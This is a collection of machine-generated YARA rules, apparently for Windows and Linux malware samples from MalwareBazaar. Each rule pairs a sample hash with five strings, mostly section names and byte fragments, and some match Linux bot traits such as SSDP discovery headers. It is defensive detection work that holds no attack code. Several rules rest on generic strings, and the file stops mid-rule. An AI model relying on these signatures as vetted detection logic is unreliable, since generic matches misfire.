rule Linux_b66d2fcb89ddd85d59e01807ea386b2fddfe8e7ad44d4d06beb6c305f643df6a
{
    meta:
        description = "Auto ML: b66d2fcb89ddd85d59e01807ea386b2fddfe8e7ad44d4d06beb6c305f643df6a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "M-SEARCH * HTTP/1.1"
        $s3 = "HOST: 255.255.255.255:1900"
        $s4 = "MAN: \"ssdp:discover\""
        $s5 = "ST: urn:dial-multiscreen-org:service:dial:1"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 50KB
        and all of them
}

rule Windows_12799551e5f50de2d5bec3973d53e745d66b4f41ede09197630a8b6cdac296c2
{
    meta:
        description = "Auto ML: 12799551e5f50de2d5bec3973d53e745d66b4f41ede09197630a8b6cdac296c2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4700KB
        and all of them
}

rule Windows_b67319d5978b2236bb8a735b1838b18b6432cb835fce1b9b08ff2d68e012bc50
{
    meta:
        description = "Auto ML: b67319d5978b2236bb8a735b1838b18b6432cb835fce1b9b08ff2d68e012bc50"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "<btnTimKiem_Click>b__20_0"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 973KB
        and all of them
}

rule Windows_b685d98c96230b80dfe1b518d77326c513c84af86aa4047602b0da3215574981
{
    meta:
        description = "Auto ML: b685d98c96230b80dfe1b518d77326c513c84af86aa4047602b0da3215574981"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "1Q~shI"
        $s3 = "G>IqJjl"
        $s4 = "va<BTtx'zq"
        $s5 = "4b}oqd"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1832KB
        and all of them
}

rule Windows_b6bc62948875b3b8f74a1726bcbce53e74f1c918b0676d20e6bbf76f9f069ae2
{
    meta:
        description = "Auto ML: b6bc62948875b3b8f74a1726bcbce53e74f1c918b0676d20e6bbf76f9f069ae2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "\")-HeH.%N"
        $s5 = "U:SdGB"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 856KB
        and all of them
}

rule Windows_b6d3fe2a1b36d208fb9451e694bc9ca45b6cc56600fb0a2aa8d49629345d0ecd
{
    meta:
        description = "Auto ML: b6d3fe2a1b36d208fb9451e694bc9ca45b6cc56600fb0a2aa8d49629345d0ecd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4007KB
        and all of them
}

rule Windows_b6e0b3fdd03c8e6da4709362e6c1dc95e5af4443a5bb6335ab848c1f26c0bee5
{
    meta:
        description = "Auto ML: b6e0b3fdd03c8e6da4709362e6c1dc95e5af4443a5bb6335ab848c1f26c0bee5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "S>tRich"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = ".nisoco"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 732KB
        and all of them
}

rule Linux_b6f1a498490d42e2b8ba425f4392715377f34033115c6ef5ed15ec568048bd19
{
    meta:
        description = "Auto ML: b6f1a498490d42e2b8ba425f4392715377f34033115c6ef5ed15ec568048bd19"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "N&tOk}"
        $s2 = "HY9EVG"
        $s3 = "SXaB'["
        $s4 = "pCQ&v\\1"
        $s5 = "^HKfo@"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 38KB
        and all of them
}

rule Linux_b70a3e0a007a775b4bb39f951e43ce0b094512e7cf3205e7d4bb40e5c3a6275b
{
    meta:
        description = "Auto ML: b70a3e0a007a775b4bb39f951e43ce0b094512e7cf3205e7d4bb40e5c3a6275b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "M-SEARCH * HTTP/1.1"
        $s3 = "HOST: 255.255.255.255:1900"
        $s4 = "MAN: \"ssdp:discover\""
        $s5 = "ST: urn:dial-multiscreen-org:service:dial:1"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 143KB
        and all of them
}

rule Windows_b74b718bc7d748634e8522ee94e83bf48ca66942c9f8bf88252d908910982fdd
{
    meta:
        description = "Auto ML: b74b718bc7d748634e8522ee94e83bf48ca66942c9f8bf88252d908910982fdd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6343KB
        and all of them
}

rule Windows_b74ed680f0ede6f0d9d864481aee4f7e12137f25a4ad071524a2ef7e9a61a7ba
{
    meta:
        description = "Auto ML: b74ed680f0ede6f0d9d864481aee4f7e12137f25a4ad071524a2ef7e9a61a7ba"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "InnolZJ"
        $s2 = "This program must be run under Win32"
        $s3 = ".rdata"
        $s4 = "P.reloc"
        $s5 = "P.rsrc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4759KB
        and all of them
}

rule Windows_b7a46b6c3fd98866134d8a5831a82b7444c0c2d5fe6692adfab92051e3541c7f
{
    meta:
        description = "Auto ML: b7a46b6c3fd98866134d8a5831a82b7444c0c2d5fe6692adfab92051e3541c7f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "NY Z/I"
        $s4 = "#Strings"
        $s5 = "Framework"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 397KB
        and all of them
}

rule Windows_128c9389df360d8efb8936c7cfd12656a6a063d1a57793cf203e8f77d9d170bd
{
    meta:
        description = "Auto ML: 128c9389df360d8efb8936c7cfd12656a6a063d1a57793cf203e8f77d9d170bd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "kQRich"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = ".pdata"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 980KB
        and all of them
}

rule Windows_b7a53067b4b97c4bcea3aa0e0f7c3366df68f5efc0e7d990dc32a8191fb1f951
{
    meta:
        description = "Auto ML: b7a53067b4b97c4bcea3aa0e0f7c3366df68f5efc0e7d990dc32a8191fb1f951"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".heton"
        $s5 = "0WWWWW"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 256KB
        and all of them
}

rule Windows_b7b5a0f0f5e0df2055debbc9e1a5b7c96b0170b24b21cd66ecb272c070d5fa9f
{
    meta:
        description = "Auto ML: b7b5a0f0f5e0df2055debbc9e1a5b7c96b0170b24b21cd66ecb272c070d5fa9f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "button10"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 631KB
        and all of them
}

rule Linux_b7b62436f18ee4fa5b210d099271976d9a7b02dcce605703358a8c68372de063
{
    meta:
        description = "Auto ML: b7b62436f18ee4fa5b210d099271976d9a7b02dcce605703358a8c68372de063"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "RL8*GC"
        $s2 = "4w?BtJ"
        $s3 = "Z)rjv("
        $s4 = "Cu:<Cx^"
        $s5 = "d`mo@l"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 13KB
        and all of them
}

rule Windows_b7c0f7b80c62db35dd345117351e8d872d698b13bb6f72a300a917d3e5680e6f
{
    meta:
        description = "Auto ML: b7c0f7b80c62db35dd345117351e8d872d698b13bb6f72a300a917d3e5680e6f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "Action`10"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 63KB
        and all of them
}

rule Windows_b7e8263a9210b8d4b85e957fd5cf0d23626926f7e41c1df3bbe468d12609d6e6
{
    meta:
        description = "Auto ML: b7e8263a9210b8d4b85e957fd5cf0d23626926f7e41c1df3bbe468d12609d6e6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "0SSSSS"
        $s5 = "tehI/@"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 810KB
        and all of them
}

rule Windows_b7ff60dd4a04629b392b28542a830553cd6dd560cbc66bb710fbac465ddf4d1e
{
    meta:
        description = "Auto ML: b7ff60dd4a04629b392b28542a830553cd6dd560cbc66bb710fbac465ddf4d1e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3816KB
        and all of them
}

rule Windows_b839a06030277c44e842557ceb98ff7e06861b93c0922c61b47bd45bcf208408
{
    meta:
        description = "Auto ML: b839a06030277c44e842557ceb98ff7e06861b93c0922c61b47bd45bcf208408"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "Whirtles"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 300KB
        and all of them
}

rule Windows_b8410c46b62f3f4fa0255c4fa37c4899f2fa7ee69883d35bd178e629e2db24db
{
    meta:
        description = "Auto ML: b8410c46b62f3f4fa0255c4fa37c4899f2fa7ee69883d35bd178e629e2db24db"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "PADPADPA"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 431KB
        and all of them
}

rule Windows_b852a910668d96c99c4871a22e8f12f83c120949e2db5a2daf4123dff6929553
{
    meta:
        description = "Auto ML: b852a910668d96c99c4871a22e8f12f83c120949e2db5a2daf4123dff6929553"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "strict_rules_for_installation_on_pcs"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4030KB
        and all of them
}

rule Windows_b86925369c2833010ca7b6d0f0b6711ab2c9ab6b54ab9742e56865e6217acf37
{
    meta:
        description = "Auto ML: b86925369c2833010ca7b6d0f0b6711ab2c9ab6b54ab9742e56865e6217acf37"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "L$0WQW"
        $s5 = "Pjmh +G"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 8056KB
        and all of them
}

rule Windows_12f842c1065cf459f3e9fccf3abd75cc37af8f65c06bc7e93f29ec2cbdba9832
{
    meta:
        description = "Auto ML: 12f842c1065cf459f3e9fccf3abd75cc37af8f65c06bc7e93f29ec2cbdba9832"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".ndata"
        $s5 = "Instu`"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2410KB
        and all of them
}

rule Windows_b86c596eb340e3083477d65046ace9dbd21a4fe8ff4f3b6e1dd12508ab9099d8
{
    meta:
        description = "Auto ML: b86c596eb340e3083477d65046ace9dbd21a4fe8ff4f3b6e1dd12508ab9099d8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "<>c__DisplayClass0_0"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 570KB
        and all of them
}

rule Linux_b8a78216d6f5375b58799711ddf70519790f24454e21b2ccd0b80179c13de79e
{
    meta:
        description = "Auto ML: b8a78216d6f5375b58799711ddf70519790f24454e21b2ccd0b80179c13de79e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "GJgh]|"
        $s2 = "T+T#sU^"
        $s3 = "A3i\"VN"
        $s4 = "Br$}U\"b"
        $s5 = "eOXw~D"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 33KB
        and all of them
}

rule Windows_b8b2ae812b47196a7be9ec41d6186eeaf28f2924b906299995db446be091d5e0
{
    meta:
        description = "Auto ML: b8b2ae812b47196a7be9ec41d6186eeaf28f2924b906299995db446be091d5e0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "S>tRich"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = ".filiha"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 204KB
        and all of them
}

rule Linux_b8f289fadbf32bcd3c562041c6b84f34a38370938140b125d692e2ff46375422
{
    meta:
        description = "Auto ML: b8f289fadbf32bcd3c562041c6b84f34a38370938140b125d692e2ff46375422"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Ki-m}N|"
        $s2 = "Kz;+lU"
        $s3 = "h^`rCg"
        $s4 = "D? FFg"
        $s5 = "QBPoRs"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 28KB
        and all of them
}

rule Linux_b900c521650c7881da93a3cfbb8724e5069a7e50f57da305d17ff1fe99fba2ea
{
    meta:
        description = "Auto ML: b900c521650c7881da93a3cfbb8724e5069a7e50f57da305d17ff1fe99fba2ea"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "[]A\\A]A^A_"
        $s2 = "AVAUATS"
        $s3 = "X[A\\A]A^"
        $s4 = "AWAVAUATUH"
        $s5 = "AWAVAUI"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 81KB
        and all of them
}

rule Windows_b90a5b9a5ee5305fdb4bbaa5992849e15942037bafe241eb965325e5bd056f49
{
    meta:
        description = "Auto ML: b90a5b9a5ee5305fdb4bbaa5992849e15942037bafe241eb965325e5bd056f49"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4432KB
        and all of them
}

rule Windows_b9123eff82d12c62b247a51cdb9ea2b166d38f1ec8dba8b6ef9be868e44eda15
{
    meta:
        description = "Auto ML: b9123eff82d12c62b247a51cdb9ea2b166d38f1ec8dba8b6ef9be868e44eda15"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "PADPADPtHc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6610KB
        and all of them
}

rule Linux_b921cea2f6ff86df25de69e5f50c907dddaef510ebc0e48ae958700d3d4e738e
{
    meta:
        description = "Auto ML: b921cea2f6ff86df25de69e5f50c907dddaef510ebc0e48ae958700d3d4e738e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "UU4BUV"
        $s2 = "ff4Bfg"
        $s3 = "ff4Jfg"
        $s4 = "Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)"
        $s5 = "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 152KB
        and all of them
}

rule Linux_ba5d6041f11bb74230034ab1f3f4a9cb206fcc6924459031214b033a8aecca79
{
    meta:
        description = "Auto ML: ba5d6041f11bb74230034ab1f3f4a9cb206fcc6924459031214b033a8aecca79"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "/proc/net/route"
        $s2 = "(null)"
        $s3 = "Self Rep Fucking NeTiS and Thisity 0n Ur FuCkInG FoReHeAd We BiG L33T HaxErS"
        $s4 = "/usr/bin/apt-get"
        $s5 = "Ubuntu"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 90KB
        and all of them
}

rule Windows_baaa618702b0ed65594c6e93e9cb6003315fd12ae68e2fda5548f9f1752f6109
{
    meta:
        description = "Auto ML: baaa618702b0ed65594c6e93e9cb6003315fd12ae68e2fda5548f9f1752f6109"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6622KB
        and all of them
}

rule Windows_0139a0a3cc53046587aa8ae1035f923cc3be9dd9490b4192ed912d62ac84bb03
{
    meta:
        description = "Auto ML: 0139a0a3cc53046587aa8ae1035f923cc3be9dd9490b4192ed912d62ac84bb03"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "MSVBVM60.DLL"
        $s4 = "Install, Setup or Update"
        $s5 = "CoolerBar"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5252KB
        and all of them
}

rule Windows_1336fafe5a37ce0a8487d349484b679fe5745c965027483bae09015d09ddb866
{
    meta:
        description = "Auto ML: 1336fafe5a37ce0a8487d349484b679fe5745c965027483bae09015d09ddb866"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This file was created by ClamAV for internal use and should not be run."
        $s2 = "ClamAV - A GPL virus scanner - http://www.clamav.net"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = "T$$PQj"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1056KB
        and all of them
}

rule Linux_baccfe00837fe4ed8b6ebfdc02c2b198054a9ee11e4b7e0475e5abe60f91b033
{
    meta:
        description = "Auto ML: baccfe00837fe4ed8b6ebfdc02c2b198054a9ee11e4b7e0475e5abe60f91b033"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M{S#FaSr"
        $s2 = "#)oqZ'Q"
        $s3 = "g%xB.j*"
        $s4 = "b-GEtD"
        $s5 = "lb&<WQ"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 56KB
        and all of them
}

rule Windows_baf1ef6054b6f5218ae5c53b563d80f8a6bfc96a486e25550f613c9a4024634b
{
    meta:
        description = "Auto ML: baf1ef6054b6f5218ae5c53b563d80f8a6bfc96a486e25550f613c9a4024634b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode.$"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "Lfffff."
        $s5 = "fffff."

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 386KB
        and all of them
}

rule Windows_bb68113cfaba1def162b8a0df4b1d41b83ea34ce4fd5b23e0a0b75b259b62bfc
{
    meta:
        description = "Auto ML: bb68113cfaba1def162b8a0df4b1d41b83ea34ce4fd5b23e0a0b75b259b62bfc"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "NRich}"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = ".gfids"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3721KB
        and all of them
}

rule Windows_bb69773fb9f66bfdf541104d0bcdaa83208c756fad16679eb334c459853897e4
{
    meta:
        description = "Auto ML: bb69773fb9f66bfdf541104d0bcdaa83208c756fad16679eb334c459853897e4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "DRich="
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = ".zusobeh|"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 276KB
        and all of them
}

rule Linux_bbb0547890ab42791e6bba722fc959466834535b67be66e8f58b3623d6736e35
{
    meta:
        description = "Auto ML: bbb0547890ab42791e6bba722fc959466834535b67be66e8f58b3623d6736e35"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "@VU<CRND"
        $s2 = "ac8<KD"
        $s3 = "aqIGAd"
        $s4 = "VS`@NN"
        $s5 = "&L\")IOJ]]"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 25KB
        and all of them
}

rule Windows_bbb2ad171db12bf6179bad65dcd9eefe42a3f6d756befb9aa3d04948d860c289
{
    meta:
        description = "Auto ML: bbb2ad171db12bf6179bad65dcd9eefe42a3f6d756befb9aa3d04948d860c289"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.reloc"
        $s5 = "WWjdh,"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1270KB
        and all of them
}

rule Windows_bbb41484a215f4bdf278d2fee0ce2581c78468b7163f57bc4846e620275deb45
{
    meta:
        description = "Auto ML: bbb41484a215f4bdf278d2fee0ce2581c78468b7163f57bc4846e620275deb45"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "KDBM(k"
        $s5 = "#Strings"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 106KB
        and all of them
}

rule Windows_bc09a4abcd910dee1fba2dd17ca4fad999ebd43be50a3c46cd3ae253d594199f
{
    meta:
        description = "Auto ML: bc09a4abcd910dee1fba2dd17ca4fad999ebd43be50a3c46cd3ae253d594199f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "iRichu"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = ".ndata"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 203KB
        and all of them
}

rule Windows_bc25f4a5eecfb787a6ec1a10fedfdd917cd186447133e1570cc688d8ea7c5549
{
    meta:
        description = "Auto ML: bc25f4a5eecfb787a6ec1a10fedfdd917cd186447133e1570cc688d8ea7c5549"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "``.data"
        $s3 = ".rdata"
        $s4 = "`@.pdata"
        $s5 = "0@.xdata"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 46822KB
        and all of them
}

rule Windows_bc5bbcae0fe7bce37b744677acb4602b8e2d31f8120aefcf4f648937a0c6e210
{
    meta:
        description = "Auto ML: bc5bbcae0fe7bce37b744677acb4602b8e2d31f8120aefcf4f648937a0c6e210"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "11NJH4CYO"
        $s5 = "qSERIy4"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 342KB
        and all of them
}

rule Windows_13735fe34c4fb1fc5efca9336215af08efaeca20859c61409f9fb7c7afc82332
{
    meta:
        description = "Auto ML: 13735fe34c4fb1fc5efca9336215af08efaeca20859c61409f9fb7c7afc82332"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2543KB
        and all of them
}

rule Linux_bc6c9d15af9714ba1398367e91c7d3980c7f18f1359e44f3cb30653839340287
{
    meta:
        description = "Auto ML: bc6c9d15af9714ba1398367e91c7d3980c7f18f1359e44f3cb30653839340287"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "M-SEARCH * HTTP/1.1"
        $s3 = "HOST: 255.255.255.255:1900"
        $s4 = "MAN: \"ssdp:discover\""
        $s5 = "ST: urn:dial-multiscreen-org:service:dial:1"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 147KB
        and all of them
}

rule Windows_bc72427282ffa8c3a16209daec0648ded710e748a20600d217edfb8de6a582c0
{
    meta:
        description = "Auto ML: bc72427282ffa8c3a16209daec0648ded710e748a20600d217edfb8de6a582c0"
